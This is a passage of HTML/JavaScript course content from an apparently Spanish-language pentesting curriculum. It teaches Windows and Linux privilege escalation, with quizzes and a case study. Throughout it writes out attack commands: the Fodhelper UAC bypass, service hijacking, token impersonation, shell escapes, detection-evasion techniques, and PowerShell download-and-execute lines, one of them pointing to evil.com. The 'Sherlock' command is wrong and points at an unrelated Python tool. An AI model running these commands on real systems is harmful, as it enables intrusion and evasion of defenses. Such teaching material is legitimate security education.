                                <input type="radio" name="q3" value="d">
                                <span class="option-text">Claves de registro</span>
                            </label>
                        </div>
                    </div>
                    
                    <button class="btn btn-primary" onclick="checkQuizAnswers()">Verificar Respuestas</button>
                    <div class="quiz-results mt-3" id="quiz-results" style="display: none;"></div>
                </div>

                <div class="topic-summary mt-4">
                    <h4>
                        <svg class="summary-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-summary"></use>
                        </svg>
                        Resumen del Tema
                    </h4>
                    <div class="summary-content">
                        <div class="row">
                            <div class="col-md-6">
                                <div class="summary-section">
                                    <h6>Conceptos Clave:</h6>
                                    <ul class="summary-list">
                                        <li>Escalamiento horizontal vs vertical</li>
                                        <li>Técnicas de movimiento lateral</li>
                                        <li>Pass-the-Hash y Pass-the-Ticket</li>
                                        <li>Explotación de credenciales</li>
                                        <li>Mecanismos de persistencia</li>
                                    </ul>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="summary-section">
                                    <h6>Herramientas Principales:</h6>
                                    <ul class="summary-list">
                                        <li>Mimikatz - Extracción de credenciales</li>
                                        <li>Rubeus - Manipulación de Kerberos</li>
                                        <li>WMI - Ejecución remota</li>
                                        <li>BloodHound - Mapeo de AD</li>
                                        <li>Impacket - Suite de herramientas</li>
                                    </ul>                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="topic-actions mt-4">
                    <button class="btn btn-sena-primary" onclick="completeTopic(0)">
                        <svg class="btn-icon me-2" width="16" height="16" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-check"></use>
                        </svg>                        Marcar como Completado
                    </button>
                </div>
            </div>
        `
    },
      'escalamiento-vertical': {
        title: 'Escalamiento Vertical',
        content: `
            <div class="topic-header">
                <h2 class="text-center">
                    <svg class="topic-icon me-2" width="32" height="32" viewBox="0 0 100 100">
                        <use href="../../assets/images/icons.svg#icon-escalation-vertical"></use>
                    </svg>
                    Escalamiento Vertical
                </h2>
                <p class="topic-intro">
                    El escalamiento vertical se enfoca en obtener privilegios más altos en el mismo sistema comprometido, 
                    transformando un acceso de usuario limitado en privilegios administrativos o de sistema completo.
                </p>
            </div>

            <div class="topic-content-body">
                <h3>Fundamentos del Escalamiento Vertical</h3>
                
                <!-- Diagrama de Proceso de Escalamiento Vertical -->
                <div class="vertical-escalation-diagram mb-4">
                    <h4 class="text-center mb-3">Proceso de Escalamiento Vertical</h4>
                    <svg class="w-100" style="max-height: 400px;" viewBox="0 0 800 400">
                        <use href="../../assets/images/diagrams.svg#vertical-escalation-process"></use>
                    </svg>
                    <p class="text-center text-muted mt-2">
                        <small>Progresión de privilegios desde usuario estándar hasta control total del sistema</small>
                    </p>
                </div>

                <div class="concept-card">
                    <h4>
                        <svg class="concept-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-definition"></use>
                        </svg>
                        Concepto de Escalamiento Vertical
                    </h4>
                    <p>El escalamiento vertical, también conocido como escalamiento de privilegios, es el proceso mediante el cual un atacante que ya tiene acceso a un sistema con privilegios limitados logra obtener privilegios más altos en el mismo sistema, típicamente privilegios administrativos o de sistema.</p>
                    
                    <div class="alert alert-info">
                        <h6><i class="fas fa-lightbulb me-2"></i>Objetivos del Escalamiento Vertical:</h6>
                        <ul class="mb-0">
                            <li>Obtener privilegios administrativos (root/SYSTEM)</li>
                            <li>Acceder a archivos y recursos protegidos</li>
                            <li>Instalar software y modificar configuraciones</li>
                            <li>Establecer persistencia con privilegios elevados</li>
                        </ul>
                    </div>
                    
                    <div class="privilege-levels mt-4">
                        <h5>Niveles de Privilegios:</h5>
                        <div class="row text-center">
                            <div class="col-md-3">
                                <div class="privilege-level">
                                    <div class="level-icon user-level">
                                        <i class="fas fa-user"></i>
                                    </div>
                                    <h6>Usuario Estándar</h6>
                                    <small>Acceso limitado</small>
                                    <div class="privilege-bar" style="width: 25%;"></div>
                                </div>
                            </div>
                            <div class="col-md-3">
                                <div class="privilege-level">
                                    <div class="level-icon power-user-level">
                                        <i class="fas fa-user-plus"></i>
                                    </div>
                                    <h6>Power User</h6>
                                    <small>Algunos privilegios</small>
                                    <div class="privilege-bar" style="width: 50%;"></div>
                                </div>
                            </div>
                            <div class="col-md-3">
                                <div class="privilege-level">
                                    <div class="level-icon admin-level">
                                        <i class="fas fa-user-shield"></i>
                                    </div>
                                    <h6>Administrador</h6>
                                    <small>Control del sistema</small>
                                    <div class="privilege-bar" style="width: 85%;"></div>
                                </div>
                            </div>
                            <div class="col-md-3">
                                <div class="privilege-level">
                                    <div class="level-icon system-level">
                                        <i class="fas fa-crown"></i>
                                    </div>
                                    <h6>SYSTEM/Root</h6>
                                    <small>Control total</small>
                                    <div class="privilege-bar" style="width: 100%;"></div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="concept-card">
                    <h4>
                        <svg class="concept-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-vulnerability"></use>
                        </svg>
                        Técnicas de Explotación de Vulnerabilidades
                    </h4>
                    <p>Las vulnerabilidades del sistema operativo, aplicaciones y configuraciones incorrectas son los vectores principales para el escalamiento vertical de privilegios.</p>
                    
                    <div class="vulnerability-techniques">
                        <h5>Principales Vectores de Escalamiento:</h5>
                        <div class="row">
                            <div class="col-md-6">
                                <div class="technique-section">
                                    <h6><i class="fas fa-cog me-2 text-primary"></i>Kernel Exploits</h6>
                                    <p>Vulnerabilidades en el núcleo del sistema operativo que permiten ejecutar código con privilegios de sistema.</p>
                                    <div class="exploit-examples">
                                        <div class="example-item">
                                            <strong>Windows - MS17-010 (EternalBlue):</strong>
                                            <code>exploit/windows/smb/ms17_010_eternalblue</code>
                                            <small>Explota vulnerabilidad SMBv1</small>
                                        </div>
                                        <div class="example-item">
                                            <strong>Linux - Dirty COW (CVE-2016-5195):</strong>
                                            <code>gcc -pthread dirtyc0w.c -o dirtyc0w</code>
                                            <small>Race condition en copy-on-write</small>
                                        </div>
                                        <div class="example-item">
                                            <strong>Windows - MS16-032:</strong>
                                            <code>powershell -ExecutionPolicy Bypass -File ms16-032.ps1</code>
                                            <small>Secondary Logon Handle Privilege Escalation</small>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <div class="technique-section">
                                    <h6><i class="fas fa-server me-2 text-success"></i>Service Exploits</h6>
                                    <p>Explotación de servicios que se ejecutan con privilegios elevados pero tienen configuraciones inseguras.</p>
                                    <div class="exploit-examples">
                                        <div class="example-item">
                                            <strong>Unquoted Service Paths:</strong>
                                            <code>wmic service get name,displayname,pathname,startmode</code>
                                            <small>Busca servicios con rutas sin comillas</small>
                                        </div>
                                        <div class="example-item">
                                            <strong>Weak Service Permissions:</strong>
                                            <code>accesschk.exe -uwcqv "Authenticated Users" *</code>
                                            <small>Identifica servicios modificables</small>
                                        </div>
                                        <div class="example-item">
                                            <strong>Service Binary Hijacking:</strong>
                                            <code>sc config ServiceName binpath= "C:\\payload.exe"</code>
                                            <small>Reemplaza binario del servicio</small>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div class="row mt-3">
                            <div class="col-md-6">
                                <div class="technique-section">
                                    <h6><i class="fas fa-key me-2 text-warning"></i>Registry Exploits</h6>
                                    <p>Configuraciones incorrectas en el registro de Windows que permiten escalamiento de privilegios.</p>
                                    <div class="exploit-examples">
                                        <div class="example-item">
                                            <strong>AlwaysInstallElevated:</strong>
                                            <code>reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated</code>
                                            <small>Permite instalación con privilegios SYSTEM</small>
                                        </div>
                                        <div class="example-item">
                                            <strong>AutoRun Registry Keys:</strong>
                                            <code>reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code>
                                            <small>Modifica claves de ejecución automática</small>
                                        </div>
                                        <div class="example-item">
                                            <strong>Service Registry Permissions:</strong>
                                            <code>accesschk.exe -uvwqk HKLM\\System\\CurrentControlSet\\Services</code>
                                            <small>Verifica permisos de servicios en registro</small>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <div class="technique-section">
                                    <h6><i class="fas fa-file me-2 text-info"></i>File System Exploits</h6>
                                    <p>Aprovecha permisos incorrectos en archivos y directorios para obtener privilegios elevados.</p>
                                    <div class="exploit-examples">
                                        <div class="example-item">
                                            <strong>DLL Hijacking:</strong>
                                            <code>copy malicious.dll C:\\Windows\\System32\\legitimate.dll</code>
                                            <small>Reemplaza DLLs legítimas</small>
                                        </div>
                                        <div class="example-item">
                                            <strong>Weak File Permissions:</strong>
                                            <code>accesschk.exe -uvwqd "C:\\Program Files"</code>
                                            <small>Busca directorios escribibles</small>
                                        </div>
                                        <div class="example-item">
                                            <strong>SUID Binaries (Linux):</strong>
                                            <code>find / -perm -u=s -type f 2>/dev/null</code>
                                            <small>Encuentra binarios con SUID bit</small>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="concept-card">
                    <h4>
                        <svg class="concept-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-bypass"></use>
                        </svg>
                        Técnicas de Bypass UAC (Windows)
                    </h4>
                    <p>El Control de Cuentas de Usuario (UAC) en Windows puede ser eludido mediante diversas técnicas para ejecutar código con privilegios administrativos sin mostrar el prompt de UAC.</p>
                    
                    <div class="uac-bypass-methods">
                        <div class="row">
                            <div class="col-md-6">
                                <div class="bypass-method">
                                    <h6><i class="fas fa-file-code me-2 text-primary"></i>Fodhelper UAC Bypass</h6>
                                    <p>Utiliza la aplicación Fodhelper.exe para ejecutar comandos con privilegios elevados.</p>
                                    <div class="method-steps">
                                        <div class="step-item">
                                            <strong>Paso 1 - Crear clave de registro:</strong>
                                            <code>reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "cmd.exe" /f</code>
                                        </div>
                                        <div class="step-item">
                                            <strong>Paso 2 - Agregar DelegateExecute:</strong>
                                            <code>reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f</code>
                                        </div>
                                        <div class="step-item">
                                            <strong>Paso 3 - Ejecutar Fodhelper:</strong>
                                            <code>fodhelper.exe</code>
                                        </div>
                                    </div>
                                    
                                    <div class="alert alert-success mt-3">
                                        <small><i class="fas fa-check-circle me-2"></i>
                                        <strong>Ventaja:</strong> No requiere archivos adicionales, usa binarios del sistema.</small>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <div class="bypass-method">
                                    <h6><i class="fas fa-cogs me-2 text-success"></i>COM Interface Elevation</h6>
                                    <p>Explota interfaces COM que pueden ejecutarse con privilegios elevados sin prompt UAC.</p>
                                    <div class="method-steps">
                                        <div class="step-item">
                                            <strong>ICMLuaUtil Interface:</strong>
                                            <code>powershell -c "New-Object -comObject ICMLuaUtil"</code>
                                        </div>
                                        <div class="step-item">
                                            <strong>Shell.Application COM:</strong>
                                            <code>powershell -c "$shell = New-Object -comObject Shell.Application; $shell.ShellExecute('cmd', '', '', 'runas', 1)"</code>
                                        </div>
                                        <div class="step-item">
                                            <strong>CMSTPLUA COM Interface:</strong>
                                            <code>powershell -c "[activator]::CreateInstance([type]::GetTypeFromCLSID('3E5FC7F9-9A51-4367-9063-A120244FBEC7'))"</code>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div class="row mt-3">
                            <div class="col-md-6">
                                <div class="bypass-method">
                                    <h6><i class="fas fa-shield-alt me-2 text-warning"></i>Token Impersonation</h6>
                                    <p>Roba tokens de acceso de procesos que se ejecutan con privilegios elevados.</p>
                                    <div class="method-steps">
                                        <div class="step-item">
                                            <strong>Usar Meterpreter:</strong>
                                            <code>use incognito</code>
                                        </div>
                                        <div class="step-item">
                                            <strong>Listar tokens disponibles:</strong>
                                            <code>list_tokens -u</code>
                                        </div>
                                        <div class="step-item">
                                            <strong>Impersonar token administrativo:</strong>
                                            <code>impersonate_token "NT AUTHORITY\\SYSTEM"</code>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <div class="bypass-method">
                                    <h6><i class="fas fa-terminal me-2 text-info"></i>PowerShell Execution Policy Bypass</h6>
                                    <p>Ejecuta scripts PowerShell maliciosos eludiendo las políticas de ejecución.</p>
                                    <div class="method-steps">
                                        <div class="step-item">
                                            <strong>Bypass con parámetro:</strong>
                                            <code>powershell.exe -ExecutionPolicy Bypass -File script.ps1</code>
                                        </div>
                                        <div class="step-item">
                                            <strong>Bypass con comando codificado:</strong>
                                            <code>powershell.exe -EncodedCommand [Base64EncodedCommand]</code>
                                        </div>
                                        <div class="step-item">
                                            <strong>Bypass con download string:</strong>
                                            <code>powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"</code>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="concept-card">
                    <h4>
                        <svg class="concept-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-methodology"></use>
                        </svg>
                        Metodología Sistemática de Escalamiento
                    </h4>
                    <p>Una metodología estructurada garantiza la identificación eficiente de vectores de escalamiento y maximiza las posibilidades de éxito.</p>
                    
                    <div class="escalation-methodology">
                        <h5>Fases de la Metodología:</h5>
                        <div class="accordion" id="methodologyAccordion">
                            <div class="accordion-item">
                                <h2 class="accordion-header">
                                    <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapseEnumeration">
                                        Fase 1: Enumeración del Sistema
                                    </button>
                                </h2>
                                <div id="collapseEnumeration" class="accordion-collapse collapse show" data-bs-parent="#methodologyAccordion">
                                    <div class="accordion-body">
                                        <div class="phase-content">
                                            <p>Recopilación exhaustiva de información sobre el sistema objetivo para identificar posibles vectores de ataque.</p>
                                            <div class="enumeration-commands">
                                                <div class="command-category">
                                                    <h6><i class="fas fa-info-circle me-2"></i>Información del Sistema</h6>
                                                    <div class="command-item">
                                                        <code>systeminfo</code>
                                                        <small>Información detallada del sistema Windows</small>
                                                    </div>
                                                    <div class="command-item">
                                                        <code>uname -a</code>
                                                        <small>Información del sistema Linux</small>
                                                    </div>
                                                    <div class="command-item">
                                                        <code>cat /etc/*-release</code>
                                                        <small>Versión de distribución Linux</small>
                                                    </div>
                                                </div>
                                                
                                                <div class="command-category mt-3">
                                                    <h6><i class="fas fa-users me-2"></i>Usuarios y Grupos</h6>
                                                    <div class="command-item">
                                                        <code>net user & net localgroup</code>
                                                        <small>Usuarios y grupos locales (Windows)</small>
                                                    </div>
                                                    <div class="command-item">
                                                        <code>cat /etc/passwd & groups</code>
                                                        <small>Usuarios y grupos (Linux)</small>
                                                    </div>
                                                    <div class="command-item">
                                                        <code>whoami /priv</code>
                                                        <small>Privilegios del usuario actual (Windows)</small>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="accordion-item">
                                <h2 class="accordion-header">
                                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseVulnIdentification">
                                        Fase 2: Identificación de Vulnerabilidades
                                    </button>
                                </h2>
                                <div id="collapseVulnIdentification" class="accordion-collapse collapse" data-bs-parent="#methodologyAccordion">
                                    <div class="accordion-body">
                                        <div class="phase-content">
                                            <p>Búsqueda activa de vulnerabilidades conocidas y configuraciones inseguras que permitan escalamiento.</p>
                                            <div class="vulnerability-tools">
                                                <div class="tool-category">
                                                    <h6><i class="fas fa-search me-2"></i>Herramientas Automatizadas</h6>
                                                    <div class="tool-item">
                                                        <strong>Windows:</strong>
                                                        <code>.\winPEAS.exe</code>
                                                        <small>Enumeración automatizada de Windows</small>
                                                    </div>
                                                    <div class="tool-item">
                                                        <strong>Linux:</strong>
                                                        <code>./linpeas.sh</code>
                                                        <small>Enumeración automatizada de Linux</small>
                                                    </div>
                                                    <div class="tool-item">
                                                        <strong>PowerShell:</strong>
                                                        <code>PowerUp.ps1</code>
                                                        <small>PowerShell privilege escalation</small>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="accordion-item">
                                <h2 class="accordion-header">
                                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseExploitation">
                                        Fase 3: Explotación
                                    </button>
                                </h2>
                                <div id="collapseExploitation" class="accordion-collapse collapse" data-bs-parent="#methodologyAccordion">
                                    <div class="accordion-body">
                                        <div class="phase-content">
                                            <p>Ejecución de exploits y técnicas identificadas para obtener privilegios elevados.</p>
                                            <div class="exploitation-steps">
                                                <div class="step-sequence">
                                                    <div class="sequence-step">
                                                        <div class="step-number">1</div>
                                                        <div class="step-content">
                                                            <h6>Verificación de Exploits</h6>
                                                            <p>Validar que el sistema es vulnerable antes de la explotación</p>
                                                        </div>
                                                    </div>
                                                    <div class="sequence-arrow">↓</div>
                                                    <div class="sequence-step">
                                                        <div class="step-number">2</div>
                                                        <div class="step-content">
                                                            <h6>Preparación del Payload</h6>
                                                            <p>Configurar exploit con payload apropiado</p>
                                                        </div>
                                                    </div>
                                                    <div class="sequence-arrow">↓</div>
                                                    <div class="sequence-step">
                                                        <div class="step-number">3</div>
                                                        <div class="step-content">
                                                            <h6>Ejecución Controlada</h6>
                                                            <p>Ejecutar exploit minimizando impacto en el sistema</p>
                                                        </div>
                                                    </div>
                                                    <div class="sequence-arrow">↓</div>
                                                    <div class="sequence-step">
                                                        <div class="step-number">4</div>
                                                        <div class="step-content">
                                                            <h6>Verificación de Privilegios</h6>
                                                            <p>Confirmar obtención de privilegios elevados</p>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>                <div class="concept-card">
                    <h4>
                        <svg class="concept-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-tools"></use>
                        </svg>
                        Herramientas de Enumeración y Escalamiento
                    </h4>
                    <p>Herramientas especializadas en la automatización del proceso de enumeración y escalamiento de privilegios para sistemas Windows y Linux.</p>
                    
                    <div class="escalation-tools">
                        <div class="row">
                            <div class="col-md-6">
                                <div class="tool-highlight">
                                    <h6><i class="fas fa-windows me-2 text-primary"></i>WinPEAS</h6>
                                    <p>Script automatizado para enumeración de escalamiento de privilegios en Windows.</p>
                                    <div class="tool-examples">
                                        <div class="example-item">
                                            <strong>Ejecución básica:</strong>
                                            <pre class="command-block">.\winPEAS.exe</pre>
                                        </div>
                                        <div class="example-item">
                                            <strong>Output a archivo:</strong>
                                            <pre class="command-block">.\winPEAS.exe > output.txt</pre>
                                        </div>
                                        <div class="example-item">
                                            <strong>Modo silencioso:</strong>
                                            <pre class="command-block">.\winPEAS.exe quiet</pre>
                                        </div>
                                    </div>
                                    
                                    <div class="alert alert-info mt-3">
                                        <small><i class="fas fa-lightbulb me-2"></i>
                                        <strong>Características:</strong> Enumera servicios, permisos, registros, tareas programadas y vulnerabilidades conocidas.</small>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <div class="tool-highlight">
                                    <h6><i class="fas fa-linux me-2 text-success"></i>LinPEAS</h6>
                                    <p>Script de enumeración para escalamiento de privilegios en sistemas Linux/Unix.</p>
                                    <div class="tool-examples">
                                        <div class="example-item">
                                            <strong>Ejecución directa:</strong>
                                            <pre class="command-block">./linpeas.sh</pre>
                                        </div>
                                        <div class="example-item">
                                            <strong>Con colores:</strong>
                                            <pre class="command-block">./linpeas.sh -a</pre>
                                        </div>
                                        <div class="example-item">
                                            <strong>Solo exploits:</strong>
                                            <pre class="command-block">./linpeas.sh -o SysI,Devs,AvaSof,ProCronSrvcsTmrsSocks,Net,UsrsGrps,SofI,IntFiles</pre>
                                        </div>
                                    </div>
                                    
                                    <div class="performance-stats mt-3">
                                        <small class="text-muted">
                                            <i class="fas fa-chart-line me-1"></i>
                                            Identifica automáticamente vectores de escalamiento comunes
                                        </small>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div class="row mt-3">
                            <div class="col-md-6">
                                <div class="scanner-tool">
                                    <h6><i class="fas fa-powershell me-2 text-warning"></i>PowerUp</h6>
                                    <p>Framework PowerShell para identificar configuraciones incorrectas comunes de Windows.</p>
                                    <ul class="features-list">
                                        <li>Service enumeration and abuse</li>
                                        <li>Registry key abuse</li>
                                        <li>Unquoted service paths</li>
                                        <li>AlwaysInstallElevated checks</li>
                                    </ul>
                                    <div class="usage-example">
                                        <small><strong>Uso:</strong></small>
                                        <pre class="mini-command">Import-Module .\PowerUp.ps1; Invoke-AllChecks</pre>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <div class="scanner-tool">
                                    <h6><i class="fas fa-search me-2 text-info"></i>Windows Exploit Suggester</h6>
                                    <p>Compara parches del sistema con base de datos de exploits conocidos.</p>
                                    <ul class="features-list">
                                        <li>Análisis de parches instalados</li>
                                        <li>Mapeo con exploits públicos</li>
                                        <li>Priorización por criticidad</li>
                                        <li>Base de datos actualizada</li>
                                    </ul>
                                    <div class="usage-example">
                                        <small><strong>Comando:</strong></small>
                                        <pre class="mini-command">python windows-exploit-suggester.py --database 2023-exploits.xlsx --systeminfo systeminfo.txt</pre>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div class="row mt-3">
                            <div class="col-md-6">
                                <div class="scanner-tool">
                                    <h6><i class="fas fa-unlock me-2 text-danger"></i>GTFOBins</h6>
                                    <p>Base de datos de binarios Unix que pueden ser explotados para escalamiento.</p>
                                    <div class="gtfobins-examples">
                                        <div class="example-item">
                                            <strong>Ejemplo con 'find':</strong>
                                            <pre class="command-block">find . -exec /bin/sh \; -quit</pre>
                                        </div>
                                        <div class="example-item">
                                            <strong>Ejemplo con 'vim':</strong>
                                            <pre class="command-block">vim -c ':!/bin/sh'</pre>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="col-md-6">
                                <div class="scanner-tool">
                                    <h6><i class="fas fa-robot me-2 text-secondary"></i>Automated Tools</h6>
                                    <p>Herramientas de automatización para escalamiento sistemático.</p>
                                    <div class="automated-tools">
                                        <div class="example-item">
                                            <strong>AccessChk:</strong>
                                            <pre class="command-block">accesschk.exe -uwcqv "Authenticated Users" *</pre>
                                        </div>
                                        <div class="example-item">
                                            <strong>Sherlock:</strong>
                                            <pre class="command-block">IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/sherlock-project/sherlock/master/sherlock.py')</pre>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="concept-card">
                    <h4>
                        <svg class="concept-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-stealth"></use>
                        </svg>
                        Técnicas de Evasión durante Escalamiento
                    </h4>
                    <p>Métodos avanzados para evitar la detección de sistemas de seguridad durante el proceso de escalamiento de privilegios.</p>
                    
                    <div class="evasion-techniques">
                        <div class="row">
                            <div class="col-md-12">
                                <div class="evasion-category">
                                    <h5><i class="fas fa-mask me-2"></i>Técnicas de Evasión Común</h5>
                                    <div class="evasion-grid">
                                        <div class="row">
                                            <div class="col-md-6">
                                                <div class="evasion-method">
                                                    <h6>Ofuscación de Código</h6>
                                                    <pre class="command-block">powershell -enc [Base64EncodedCommand]</pre>
                                                    <small>Codifica comandos PowerShell en Base64</small>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="evasion-method">
                                                    <h6>Process Hollowing</h6>
                                                    <pre class="command-block">CreateProcess + WriteProcessMemory + ResumeThread</pre>
                                                    <small>Inyecta código en procesos legítimos</small>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row mt-3">
                                            <div class="col-md-6">
                                                <div class="evasion-method">
                                                    <h6>DLL Sideloading</h6>
                                                    <pre class="command-block">copy malicious.dll legitimate_app_folder\</pre>
                                                    <small>Explota orden de búsqueda de DLLs</small>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="evasion-method">
                                                    <h6>Living off the Land</h6>
                                                    <pre class="command-block">certutil -decode payload.txt payload.exe</pre>
                                                    <small>Usa herramientas legítimas del sistema</small>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row mt-3">
                                            <div class="col-md-6">
                                                <div class="evasion-method">
                                                    <h6>Time-based Evasion</h6>
                                                    <pre class="command-block">Start-Sleep -Seconds 300</pre>
                                                    <small>Retarda ejecución para evadir sandboxes</small>
                                                </div>
                                            </div>
                                            <div class="col-md-6">
                                                <div class="evasion-method">
                                                    <h6>Memory-only Execution</h6>
                                                    <pre class="command-block">IEX (New-Object Net.WebClient).DownloadString('url')</pre>
                                                    <small>Ejecuta sin tocar disco</small>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="topic-quiz mt-4">
                    <h4>
                        <svg class="quiz-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-quiz"></use>
                        </svg>
                        Verifica tu Comprensión
                    </h4>
                    <div class="quiz-question">
                        <p><strong>¿Cuál es la principal diferencia entre WinPEAS y LinPEAS?</strong></p>
                        <div class="quiz-options">
                            <label class="quiz-option">
                                <input type="radio" name="q_vertical_1" value="a">
                                <span>WinPEAS es más rápido que LinPEAS</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q_vertical_1" value="b">
                                <span>Están diseñados para diferentes sistemas operativos</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q_vertical_1" value="c">
                                <span>LinPEAS encuentra más vulnerabilidades</span>
                            </label>
                        </div>                    </div>
                    
                    <div class="quiz-question mt-3">
                        <p><strong>¿Qué técnica UAC bypass utiliza el registro de Windows?</strong></p>
                        <div class="quiz-options">
                            <label class="quiz-option">
                                <input type="radio" name="q_vertical_2" value="a">
                                <span>Process Hollowing</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q_vertical_2" value="b">
                                <span>Fodhelper UAC Bypass</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q_vertical_2" value="c">
                                <span>DLL Sideloading</span>
                            </label>
                        </div>
                    </div>
                    
                    <div class="quiz-actions mt-4">
                        <button class="btn btn-sena-primary" onclick="checkVerticalQuizAnswers()">
                            <svg class="btn-icon me-2" width="16" height="16" viewBox="0 0 100 100">
                                <use href="../../assets/images/icons.svg#icon-check"></use>
                            </svg>
                            Verificar Respuestas
                        </button>
                    </div>
                </div>

                <div class="case-study mt-4">
                    <h4 class="text-center">
                        <svg class="case-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-case-study"></use>
                        </svg>
                        Caso de Estudio: Escalamiento en Entorno Corporativo
                    </h4>
                    <div class="case-content">
                        <div class="case-scenario">
                            <h6>📚 Escenario:</h6>
                            <p>Has obtenido acceso como usuario estándar en un sistema Windows 10 corporativo con Windows Defender habilitado. Necesitas escalar privilegios para acceder a archivos sensibles del administrador local sin ser detectado por las soluciones de seguridad.</p>
                        </div>
                        
                        <div class="case-question mt-3">
                            <h6>❓ Pregunta de Análisis:</h6>
                            <p><strong>¿Cuál sería el enfoque más discreto y efectivo?</strong></p>                            <div class="case-options">
                                <button class="btn btn-outline-primary case-option" data-case="q_vertical_case" data-value="a" onclick="handleCaseStudy('q_vertical_case', 'a')">
                                    A) Ejecutar WinPEAS inmediatamente para encontrar vulnerabilidades
                                </button>
                                <button class="btn btn-outline-primary case-option" data-case="q_vertical_case" data-value="b" onclick="handleCaseStudy('q_vertical_case', 'b')">
                                    B) Usar Fodhelper UAC bypass con comando PowerShell ofuscado
                                </button>
                                <button class="btn btn-outline-primary case-option" data-case="q_vertical_case" data-value="c" onclick="handleCaseStudy('q_vertical_case', 'c')">
                                    C) Intentar exploit de kernel conocido como EternalBlue
                                </button>
                            </div>
                            <div class="case-feedback" id="case-q_vertical_case-feedback" style="display: none;"></div>
                        </div>
                    </div>
                </div>

                <div class="topic-actions mt-4">
                    <button class="btn btn-sena-primary" onclick="completeTopic(1)">
                        <svg class="btn-icon me-2" width="16" height="16" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-check"></use>
                        </svg>
                        Marcar como Completado
                    </button>
                </div>
            </div>
        `
    },
      'herramientas-escalamiento': {
        title: 'Herramientas de Escalamiento',
        content: `
            <div class="topic-header">
                <h2 class="text-center">
                    <svg class="topic-icon me-2" width="32" height="32" viewBox="0 0 100 100">
                        <use href="../../assets/images/icons.svg#icon-tools"></use>
                    </svg>
                    Herramientas de Escalamiento
                </h2>
                <p class="topic-intro">
                    Las herramientas de escalamiento de privilegios han evolucionado para ofrecer capacidades avanzadas de explotación, manipulación de credenciales y evasión. Dominar estas herramientas es esencial para realizar pruebas de penetración efectivas.
                </p>
            </div>

            <div class="topic-content-body">
                <h3>Herramientas Principales de Escalamiento</h3>
                
                <!-- Diagrama de Flujo de Herramientas de Escalamiento -->
                <div class="escalation-tools-diagram mb-4">
                    <h4 class="text-center mb-3">Ecosistema de Herramientas de Escalamiento</h4>
                    <svg class="w-100" style="max-height: 400px;" viewBox="0 0 800 400">
                        <use href="../../assets/images/diagrams.svg#escalation-tools-ecosystem"></use>
                    </svg>
                    <p class="text-center text-muted mt-2">
                        <small>Flujo de herramientas desde extracción de credenciales hasta mantenimiento de acceso</small>
                    </p>
                </div>

                <div class="concept-card">
                    <h4>
                        <svg class="concept-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-memory"></use>
                        </svg>
                        Mimikatz
                    </h4>
